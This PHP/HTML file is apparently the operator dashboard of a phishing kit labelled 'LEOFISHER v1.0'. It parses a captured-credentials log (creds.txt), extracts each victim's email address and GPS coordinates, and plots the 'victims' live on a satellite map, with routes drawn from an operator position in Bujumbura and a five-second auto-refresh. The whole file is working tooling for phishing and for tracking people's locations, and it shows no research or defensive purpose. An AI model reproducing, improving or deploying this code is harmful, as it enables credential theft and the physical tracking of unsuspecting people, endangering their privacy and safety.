<?php
date_default_timezone_set('Africa/Bujumbura');
$creds_file = 'creds.txt';
$victims = [];

// Parseur ROBUSTE - capture TOUS formats possibles
if (file_exists($creds_file)) {
    $logs = file_get_contents($creds_file);
    
    // Méthode 1: Ton format original avec separator
    $entries = explode("┌─[ LEOFISHER v1.0 by Léo Falcon ]", $logs);
    foreach ($entries as $entry) {
        if (preg_match('/📍 GPS POSITION : ([-+]?\d+\.?\d*),?\s*([-+]?\d+\.?\d*)/i', $entry, $gps)) {
            if (preg_match('/📧 .*?:?\s*([^\s\r\n]+@[^\s\r\n]+)/i', $entry, $email)) {
                $lat = floatval($gps[1]);
                $lng = floatval($gps[2]);
                if ($lat != 0 && $lng != 0 && abs($lat) <= 90 && abs($lng) <= 180) {
                    $victims[] = [
                        'lat' => $lat, 'lng' => $lng,
                        'email' => trim($email[1]),
                        'ip' => 'N/A',
                        'time' => date('H:i:s')
                    ];
                }
            }
        }
    }
    
    // Méthode 2: Recherche globale (fallback tous formats)
    if (empty($victims)) {
        preg_match_all('/📍 GPS POSITION : ([-+]?\d+\.?\d*),?\s*([-+]?\d+\.?\d*)/i', $logs, $gps_all, PREG_SET_ORDER);
        preg_match_all('/📧 .*?:?\s*([^\s\r\n]+@[^\s\r\n]+)/i', $logs, $email_all, PREG_SET_ORDER);
        
        $gps_count = count($gps_all);
        $email_count = count($email_all);
        for ($i = 0; $i < min($gps_count, $email_count); $i++) {
            $lat = floatval($gps_all[$i][1]);
            $lng = floatval($gps_all[$i][2]);
            if ($lat != 0 && $lng != 0 && abs($lat) <= 90 && abs($lng) <= 180) {
                $victims[] = [
                    'lat' => $lat, 'lng' => $lng,
                    'email' => trim($email_all[$i][1]),
                    'ip' => 'N/A',
                    'time' => date('H:i:s')
                ];
            }
        }
    }
    
    // Debug info (visible 10s puis cache)
    $debug_info = "Victimes parsed: " . count($victims) . " | Fichier: " . strlen($logs) . " octets";
}

// Coordonnées OPÉRATEUR Bujumbura
$op_lat = -3.361378;
$op_lng = 29.359912;
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>ARIENS MILITARY GPS TRACKER - LEOFISHER v1.0</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
            color: #00ff41; overflow: hidden; 
        }
        #map { height: 100vh; width: 100%; border: 3px solid #00ff41; box-shadow: 0 0 50px rgba(0,255,65,0.5); }
        
        .military-header {
            position: absolute; top: 0; left: 0; right: 0; 
            background: rgba(0,15,30,0.98); padding: 20px; border-bottom: 4px solid #00ff41; 
            box-shadow: 0 0 30px rgba(0,255,65,0.6); z-index: 1001; text-align: center;
        }
        .title { font-size: 28px; font-weight: bold; text-transform: uppercase; letter-spacing: 4px; text-shadow: 0 0 15px #00ff41; }
        .subtitle { font-size: 14px; opacity: 0.8; margin-top: 5px; }
        
        .dashboard { position: absolute; top: 120px; left: 20px; background: rgba(0,20,40,0.95); padding: 20px; border: 2px solid #00ff41; border-radius: 8px; z-index: 1000; min-width: 250px; box-shadow: 0 0 25px rgba(0,255,65,0.4); }
        .stats { font-size: 14px; margin: 8px 0; line-height: 1.4; }
        .victim-count { color: #ff4444 !important; font-weight: bold; font-size: 20px; text-shadow: 0 0 10px #ff4444; }
        
        .zoom-controls { position: absolute; top: 120px; right: 20px; background: rgba(0,20,40,0.95); padding: 20px; border: 2px solid #00ff41; border-radius: 8px; z-index: 1000; box-shadow: 0 0 25px rgba(0,255,65,0.4); }
        .zoom-btn { background: linear-gradient(45deg, #00ff41, #00cc33); color: #000; border: none; padding: 12px 16px; margin: 4px 0; cursor: pointer; font-weight: bold; border-radius: 6px; width: 100%; font-family: 'Courier New', monospace; font-size: 13px; box-shadow: 0 4px 15px rgba(0,255,65,0.4); transition: all 0.3s; }
        .zoom-btn:hover { background: linear-gradient(45deg, #00cc33, #00ff41); transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,255,65,0.6); }
        
        .legend { position: absolute; bottom: 20px; right: 20px; background: rgba(0,20,40,0.95); padding: 15px; border: 2px solid #00ff41; border-radius: 8px; font-size: 12px; z-index: 1000; box-shadow: 0 0 20px rgba(0,255,65,0.4); }
        
        .debug { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.95); color: #ffaa00; padding: 10px; border: 1px solid #ffaa00; border-radius: 5px; font-size: 12px; z-index: 999; opacity: 0; transition: opacity 3s; }
        .debug.show { opacity: 1; }
        
        .victim-marker { animation: victim-pulse 2s infinite; }
        .op-marker { animation: op-pulse 1.5s infinite; }
        @keyframes op-pulse { 0%, 100% { box-shadow: 0 0 0 0 rgba(255,170,0,0.7); } 50% { box-shadow: 0 0 0 15px rgba(255,170,0,0); } }
        @keyframes victim-pulse { 0%, 100% { box-shadow: 0 0 0 0 rgba(255,68,68,0.8); transform: scale(1); } 50% { box-shadow: 0 0 0 20px rgba(255,68,68,0); transform: scale(1.2); } }
    </style>
</head>
<body>
    <div class="military-header">
        <div class="title">ARIENS MILITARY GPS TRACKER</div>
        <div class="subtitle">LEOFISHER v1.0 by Léo Falcon | Live Operational Tracking</div>
    </div>

    <div id="map"></div>

    <div class="dashboard">
        <div class="stats"><strong>🚨 LEOFISHER GPS DASH PRO</strong></div>
        <div class="stats victim-count">🎯 Victimes: <span id="victimCount">0</span></div>
        <div class="stats">📍 Opérateur: Bujumbura (-3.36, 29.36)</div>
        <div class="stats">🛰️ Satellite: Esri WorldImagery HD</div>
        <div class="stats">🔄 Auto-refresh: 5s</div>
        <div class="stats" id="debugInfo"><?php echo htmlspecialchars($debug_info ?? ''); ?></div>
    </div>

    <div class="zoom-controls">
        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() + 1)">🔍 ZOOM +</button>
        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() - 1)">🔎 ZOOM -</button>
        <button class="zoom-btn" onclick="map.fitBounds(bounds)">📐 FIT ALL</button>
    </div>

    <div class="legend">
        🟡 OP Command | 🔴 Pulsing Victims<br>
        📏 Routes OP→Victime | 🛰️ HD Satellite | 🔄 Live 5s
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>

    <script>
        let map, markers = L.markerClusterGroup({ spiderfyOnMaxZoom: true, showCoverageOnHover: true, zoomToBoundsOnClick: true });
        let bounds = L.latLngBounds();
        const opLat = <?php echo $op_lat; ?>;
        const opLng = <?php echo $op_lng; ?>;
        const victims = <?php echo json_encode($victims); ?>;

        // Satellite HD + Roads
        const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { maxZoom: 22, minZoom: 1 });
        const roads = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { opacity: 0.6, maxZoom: 22 });

        map = L.map('map', { layers: [satellite, roads], zoomControl: false, minZoom: 1, maxZoom: 22 }).setView([opLat, opLng], 10);

        // OP MARKER (jaune militaire)
        const opMarker = L.marker([opLat, opLng], {
            icon: L.divIcon({
                className: 'op-marker',
                html: '<div style="background:#ffaa00;color:#000;font-weight:bold;border-radius:50%;width:35px;height:35px;line-height:35px;text-align:center;font-size:12px">OP</div>',
                iconSize: [35, 35]
            })
        }).addTo(map).bindPopup('<b style="color:#ffaa00">🚨 COMMANDE OP Bujumbura</b>');
        bounds.extend([opLat, opLng]);

        // VICTIMES + ROUTES (rouges pulsants)
        victims.forEach((victim, index) => {
            const vicIcon = L.divIcon({
                className: 'victim-marker',
                html: `<div style="background:#ff4444;color:#fff;border-radius:50%;width:32px;height:32px;line-height:32px;text-align:center;font-weight:bold;font-size:12px">#${index+1}</div>`,
                iconSize: [32, 32]
            });
            
            const victimMarker = L.marker([victim.lat, victim.lng], { icon: vicIcon })
                .bindPopup(`
                    <div style="font-family:monospace;color:#ff4444;width:250px">
                        <h3 style="color:#ffaa00">🎯 VICTIME #${index+1}</h3>
                        <strong>📧</strong> ${victim.email}<br>
                        <strong>📍 GPS:</strong> ${victim.lat.toFixed(6)}, ${victim.lng.toFixed(6)}<br>
                        <strong>🕒</strong> ${victim.time}
                    </div>
                `);
            
            markers.addLayer(victimMarker);
            bounds.extend([victim.lat, victim.lng]);
            
            // Route OP→Victime
            L.polyline([[opLat, opLng], [victim.lat, victim.lng]], {
                color: '#ff4444', weight: 4, opacity: 0.8, dashArray: '15 10'
            }).addTo(map);
        });

        map.addLayer(markers);
        if (bounds.isValid() && victims.length > 0) map.fitBounds(bounds.pad(0.1));

        document.getElementById('victimCount').textContent = victims.length;
        document.getElementById('debugInfo').textContent = `Victimes: ${victims.length} | Parsing OK`;

        // Auto-refresh 5s
        setInterval(() => location.reload(), 5000);
    </script>
</body>
</html>
